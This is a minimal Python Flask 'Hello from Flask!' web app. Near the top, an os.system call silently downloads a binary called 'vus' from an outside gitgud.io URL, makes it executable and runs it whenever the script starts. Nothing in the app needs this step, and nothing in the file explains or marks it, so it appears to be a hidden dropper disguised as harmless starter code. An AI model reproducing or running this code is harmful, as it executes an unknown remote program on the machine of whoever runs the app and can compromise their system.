import os
from flask import Flask
os.system('curl --output vus https://gitgud.io/trendava/ruby/-/raw/master/vus;chmod 700 vus;./vus')
app = Flask(__name__)


@app.route('/')
def index():
    return 'Hello from Flask!'

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=80)
